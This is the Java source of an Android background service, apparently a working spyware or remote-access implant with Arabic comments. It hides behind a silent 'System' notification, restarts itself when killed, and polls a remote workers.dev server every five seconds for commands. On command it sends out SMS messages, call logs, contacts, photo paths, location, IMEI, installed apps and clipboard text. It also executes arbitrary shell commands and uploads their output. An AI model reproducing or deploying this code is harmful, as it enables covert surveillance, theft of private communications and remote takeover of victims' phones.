package com.sec.check;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ServiceRunner extends Service {
    private static final String TAG = "SecurityCheck";
    private static final String CHANNEL_ID = "sys_service";
    private static final int NOTIFICATION_ID = 1001;
    
    // ⚠️ عدّل هذه القيم
    private static final String SERVER_URL = "https://sec.h42536974.workers.dev";
    private static final String ACTIVATION_CODE = ""; // ← يُملأ من المستخدم
    private static final int POLL_INTERVAL_SECONDS = 5;

    private ScheduledExecutorService scheduler;
    private String deviceId = "";
    private String activationCode = "";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");

        createNotificationChannel();
        startForegroundInternal();

        // ابدأ polling
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL_SECONDS, TimeUnit.SECONDS);

        // احصل على deviceId
        deviceId = getDeviceId();

        // اقرأ كود التفعيل
        activationCode = getActivationCode();

        // أرسل الإشعار الأول
        sendInitialReport();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private void startForegroundInternal() {
        try {
            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .build();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notification, 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIFICATION_ID, notification);
            }
        } catch (Exception e) {
            Log.e(TAG, "startForeground error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // أعد التشغيل
        Intent restart = new Intent(this, ServiceRunner.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
    }

    // ============================================================
    // Polling for commands
    // ============================================================
    private void pollCommands() {
        try {
            String url = SERVER_URL + "/apk/poll?device=" + deviceId + "&code=" + activationCode;
            String response = httpGet(url);
            
            if (response == null || response.isEmpty()) return;
            
            JSONObject json = new JSONObject(response);
            JSONArray commands = json.optJSONArray("commands");
            
            if (commands == null) return;
            
            for (int i = 0; i < commands.length(); i++) {
                JSONObject cmd = commands.getJSONObject(i);
                handleCommand(cmd);
            }
        } catch (Exception e) {
            Log.e(TAG, "pollCommands error: " + e.getMessage());
        }
    }

    private void handleCommand(JSONObject cmd) {
        try {
            String action = cmd.optString("action", "");
            Log.d(TAG, "Handling command: " + action);

            switch (action) {
                case "get_device_info":
                    sendDeviceInfo();
                    break;
                case "get_sms":
                    sendSms();
                    break;
                case "get_call_log":
                    sendCallLog();
                    break;
                case "get_contacts":
                    sendContacts();
                    break;
                case "get_photos":
                    sendPhotos();
                    break;
                case "get_location":
                    sendLocation();
                    break;
                case "get_apps":
                    sendApps();
                    break;
                case "get_clipboard":
                    sendClipboard();
                    break;
                case "vibrate":
                    vibrate(cmd.optLong("ms", 2000));
                    break;
                case "toast":
                    showToast(cmd.optString("text", ""));
                    break;
                case "play_sound":
                    playSound();
                    break;
                case "screenshot":
                    sendScreenshot();
                    break;
                case "shell":
                    executeShell(cmd.optString("command", ""));
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "handleCommand error: " + e.getMessage());
        }
    }

    // ============================================================
    // Commands Implementation
    // ============================================================
    private void sendInitialReport() {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "initial");
            data.put("device", deviceId);
            data.put("code", activationCode);
            data.put("model", Build.MODEL);
            data.put("brand", Build.BRAND);
            data.put("android", Build.VERSION.RELEASE);
            data.put("sdk", Build.VERSION.SDK_INT);
            data.put("manufacturer", Build.MANUFACTURER);
            
            postJson("/apk/data", data);
            Log.d(TAG, "Initial report sent");
        } catch (Exception e) {
            Log.e(TAG, "sendInitialReport error: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "device_info");
            data.put("device", deviceId);
            data.put("code", activationCode);
            data.put("model", Build.MODEL);
            data.put("brand", Build.BRAND);
            data.put("android", Build.VERSION.RELEASE);
            data.put("sdk", Build.VERSION.SDK_INT);
            
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                try {
                    data.put("imei", tm.getImei());
                    data.put("operator", tm.getNetworkOperatorName());
                    data.put("country", tm.getSimCountryIso());
                } catch (Exception e) {}
            }
            
            postJson("/apk/data", data);
        } catch (Exception e) {
            Log.e(TAG, "sendDeviceInfo error: " + e.getMessage());
        }
    }

    private void sendSms() {
        try {
            JSONArray arr = new JSONArray();
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
            
            if (cursor != null) {
                while (cursor.moveToNext() && arr.length() < 50) {
                    JSONObject sms = new JSONObject();
                    sms.put("from", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    arr.put(sms);
                }
                cursor.close();
            }
            
            JSONObject data = new JSONObject();
            data.put("type", "sms");
            data.put("device", deviceId);
            data.put("code", activationCode);
            data.put("sms", arr);
            
            postJson("/apk/data", data);
        } catch (Exception e) {
            Log.e(TAG, "sendSms error: " + e.getMessage());
        }
    }

    private void sendCallLog() {
        try {
            JSONArray arr = new JSONArray();
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            
            if (cursor != null) {
                while (cursor.moveToNext() && arr.length() < 50) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    arr.put(call);
                }
                cursor.close();
            }
            
            JSONObject data = new JSONObject();
            data.put("type", "call_log");
            data.put("device", deviceId);
            data.put("code", activationCode);
            data.put("calls", arr);
            
            postJson("/apk/data", data);
        } catch (Exception e) {
            Log.e(TAG, "sendCallLog error: " + e.getMessage());
        }
    }

    private void sendContacts() {
        try {
            JSONArray arr = new JSONArray();
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            
            if (cursor != null) {
                while (cursor.moveToNext() && arr.length() < 200) {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    contact.put("number", cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    arr.put(contact);
                }
                cursor.close();
            }
            
            JSONObject data = new JSONObject();
            data.put("type", "contacts");
            data.put("device", deviceId);
            data.put("code", activationCode);
            data.put("contacts", arr);
            
            postJson("/apk/data", data);
        } catch (Exception e) {
            Log.e(TAG, "sendContacts error: " + e.getMessage());
        }
    }

    private void sendPhotos() {
        try {
            JSONArray arr = new JSONArray();
            Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
            
            if (cursor != null) {
                while (cursor.moveToNext() && arr.length() < 20) {
                    JSONObject photo = new JSONObject();
                    photo.put("path", cursor.getString(cursor.getColumnIndexOrThrow(
                        MediaStore.Images.Media.DATA)));
                    arr.put(photo);
                }
                cursor.close();
            }
            
            JSONObject data = new JSONObject();
            data.put("type", "photos");
            data.put("device", deviceId);
            data.put("code", activationCode);
            data.put("photos", arr);
            
            postJson("/apk/data", data);
        } catch (Exception e) {
            Log.e(TAG, "sendPhotos error: " + e.getMessage());
        }
    }

    private void sendLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;
            
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
                != PackageManager.PERMISSION_GRANTED) return;
            
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            JSONObject data = new JSONObject();
            data.put("type", "location");
            data.put("device", deviceId);
            data.put("code", activationCode);
            
            if (loc != null) {
                data.put("lat", loc.getLatitude());
                data.put("lng", loc.getLongitude());
                data.put("accuracy", loc.getAccuracy());
            }
            
            postJson("/apk/data", data);
        } catch (Exception e) {
            Log.e(TAG, "sendLocation error: " + e.getMessage());
        }
    }

    private void sendApps() {
        try {
            JSONArray arr = new JSONArray();
            android.content.pm.PackageManager pm = getPackageManager();
            java.util.List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
            
            for (android.content.pm.PackageInfo pkg : packages) {
                if (arr.length() >= 100) break;
                android.content.pm.ApplicationInfo ai = pkg.applicationInfo;
                if (ai != null && (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                    JSONObject app = new JSONObject();
                    app.put("name", ai.loadLabel(pm).toString());
                    app.put("package", pkg.packageName);
                    arr.put(app);
                }
            }
            
            JSONObject data = new JSONObject();
            data.put("type", "apps");
            data.put("device", deviceId);
            data.put("code", activationCode);
            data.put("apps", arr);
            
            postJson("/apk/data", data);
        } catch (Exception e) {
            Log.e(TAG, "sendApps error: " + e.getMessage());
        }
    }

    private void sendClipboard() {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager) 
                getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null) return;
            
            String text = "";
            if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                android.content.ClipData clip = cm.getPrimaryClip();
                if (clip.getItemCount() > 0) {
                    text = clip.getItemAt(0).getText() != null ? 
                        clip.getItemAt(0).getText().toString() : "";
                }
            }
            
            JSONObject data = new JSONObject();
            data.put("type", "clipboard");
            data.put("device", deviceId);
            data.put("code", activationCode);
            data.put("text", text);
            
            postJson("/apk/data", data);
        } catch (Exception e) {
            Log.e(TAG, "sendClipboard error: " + e.getMessage());
        }
    }

    private void vibrate(long ms) {
        try {
            android.os.Vibrator v = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(ms);
        } catch (Exception e) {}
    }

    private void showToast(final String text) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                android.widget.Toast.makeText(getApplicationContext(), text, 
                    android.widget.Toast.LENGTH_LONG).show();
            } catch (Exception e) {}
        });
    }

    private void playSound() {
        try {
            android.media.Ringtone r = android.media.RingtoneManager.getRingtone(
                getApplicationContext(), 
                android.media.RingtoneManager.getDefaultUri(
                    android.media.RingtoneManager.TYPE_NOTIFICATION));
            if (r != null) r.play();
        } catch (Exception e) {}
    }

    private void sendScreenshot() {
        // معقد — يتطلب MediaProjection
        Log.d(TAG, "Screenshot requested");
    }

    private void executeShell(String command) {
        try {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            reader.close();
            
            JSONObject data = new JSONObject();
            data.put("type", "shell_result");
            data.put("device", deviceId);
            data.put("code", activationCode);
            data.put("command", command);
            data.put("output", output.toString());
            
            postJson("/apk/data", data);
        } catch (Exception e) {
            Log.e(TAG, "executeShell error: " + e.getMessage());
        }
    }

    // ============================================================
    // HTTP Helpers
    // ============================================================
    private String httpGet(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            
            if (conn.getResponseCode() == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                return sb.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "httpGet error: " + e.getMessage());
        }
        return null;
    }

    private void postJson(String path, JSONObject data) {
        try {
            URL url = new URL(SERVER_URL + path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            
            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(data.toString());
            os.flush();
            os.close();
            
            conn.getResponseCode();
        } catch (Exception e) {
            Log.e(TAG, "postJson error: " + e.getMessage());
        }
    }

    private String getDeviceId() {
        try {
            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "unknown";
        }
    }

    private String getActivationCode() {
        try {
            android.content.SharedPreferences sp = getSharedPreferences("sc_prefs", MODE_PRIVATE);
            return sp.getString("activation_code", "");
        } catch (Exception e) {
            return "";
        }
    }
                     }
